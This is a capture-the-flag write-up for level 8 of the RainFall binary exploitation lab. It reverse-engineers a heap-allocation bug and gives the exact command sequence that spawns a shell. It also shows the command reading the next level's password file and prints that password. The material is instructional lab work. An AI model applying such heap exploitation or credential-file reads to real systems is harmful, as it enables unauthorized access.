@@ -1,0 +1,53 @@
+ ▄▄▄▄                                    ▄▄▄▄                  ▄▄▄▄
+ ▀▀██                                    ▀▀██                ▄██▀▀██▄
+   ██       ▄████▄   ██▄  ▄██   ▄████▄     ██                ██▄  ▄██
+   ██      ██▄▄▄▄██   ██  ██   ██▄▄▄▄██    ██                 ██████
+   ██      ██▀▀▀▀▀▀   ▀█▄▄█▀   ██▀▀▀▀▀▀    ██                ██▀  ▀██
+   ██▄▄▄   ▀██▄▄▄▄█    ████    ▀██▄▄▄▄█    ██▄▄▄             ▀██▄▄██▀
+    ▀▀▀▀     ▀▀▀▀▀      ▀▀       ▀▀▀▀▀      ▀▀▀▀               ▀▀▀▀
+
+Using ghidra, we see that: the program reads stdin and waits for commands:
+- "service" ("servic" actually)
+- "auth "
+- "reset"
+- "login"
+
+The first step to get anything done here is to recreate the program in *readable* C
+(the original assembly is unreadable).
+
+We then see that we need *(auth + 32) != 0 in order to win.
+*auth is on the heap, there another variable on the heap: *service.
+
+Using the program:
+With the above knowledge, we notice that each time 'auth ' or 'servic' are typed,
+their respective pointer jumps 16bytes.
+
+$ ./executables/level8
+(nil), (nil)
+auth
+0x869b9c0, (nil)
+servic
+0x869b9c0, 0x869b9d0
+servic
+0x869b9c0, 0x869b9e0
+
+Type 'auth ', then 'servic' 2 times and boom, they are 32bytes appart (remember auth[32] != 0 ?).
+
+$ ./executables/level8
+(nil), (nil)
+auth
+0x869b9c0, (nil)
+servic
+0x869b9c0, 0x869b9d0
+servic Hello sir, allow me to present myself
+0x869b9c0, 0x869b9e0
+login
+sh-5.0$
+
+In the VM:
+level8@RainFall:~$ printf 'auth \nservic\nservicE\nlogin\n'>/tmp/lvl8;cat /tmp/lvl8 - | ./level8
+> (...)
+< cat /home/user/level9/.pass
+> c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+
+PS: Maybe we could also play the the free() but it seems harder
